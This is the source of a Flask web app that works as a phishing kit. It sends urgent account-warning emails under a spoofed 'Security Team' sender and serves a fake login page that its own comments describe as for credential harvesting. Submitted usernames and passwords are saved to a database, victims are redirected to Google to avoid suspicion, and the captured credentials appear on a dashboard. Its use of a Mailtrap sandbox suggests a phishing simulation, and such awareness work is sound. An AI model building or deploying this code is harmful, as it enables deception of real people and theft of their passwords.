from flask import Flask, render_template, request, redirect, url_for
from dotenv import load_dotenv
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from database import create_tables, save_credentials, get_credentials, log_email_status, get_email_logs

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)

# Mailtrap SMTP credentials from .env file
MAIL_USERNAME = os.getenv('MAIL_USERNAME')
MAIL_PASSWORD = os.getenv('MAIL_PASSWORD')
MAIL_HOST = os.getenv('MAIL_HOST')
MAIL_PORT = os.getenv('MAIL_PORT')

# Create database tables when the application starts
create_tables()

@app.route('/')
def index():
    """Renders the main page with a form to send the phishing email."""
    return render_template('index.html')

@app.route('/send_email', methods=['POST'])
def send_email():
    """Handles the form submission and sends the phishing email."""
    recipient = request.form.get('recipient_email')
    
    # Create the email message
    msg = MIMEMultipart("alternative")
    msg['From'] = "Security Team <security@demomailtrap.co>"
    msg['To'] = recipient
    msg['Subject'] = "Urgent: Action Required on Your Account"

    # Get the HTML content from your template
    html_content = render_template('email_template.html', recipient=recipient)
    part1 = MIMEText(html_content, 'html')
    msg.attach(part1)
    
    # Connect to the Mailtrap server and send the email
    try:
        with smtplib.SMTP(MAIL_HOST, MAIL_PORT) as server:
            server.starttls()
            server.login(MAIL_USERNAME, MAIL_PASSWORD)
            server.sendmail(msg['From'], msg['To'], msg.as_string())
        
        log_email_status(recipient, "Sent")
        return "Email sent successfully! Check your Mailtrap inbox."
    except Exception as e:
        log_email_status(recipient, f"Failed: {e}")
        return f"Failed to send email: {e}"

@app.route('/login')
def login_page():
    """Renders the fake login page for credential harvesting."""
    return render_template('landing_page.html')

@app.route('/capture', methods=['POST'])
def capture_credentials():
    """Captures and stores the submitted credentials."""
    username = request.form.get('username')
    password = request.form.get('password')
    
    if username and password:
        save_credentials(username, password)
    
    # Redirect the user to a real website after capture to avoid suspicion
    return redirect("https://www.google.com")

@app.route('/dashboard')
def dashboard():
    """Renders the analytics dashboard."""
    credentials = get_credentials()
    email_logs = get_email_logs()
    
    return render_template('dashboard.html', credentials=credentials, email_logs=email_logs)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
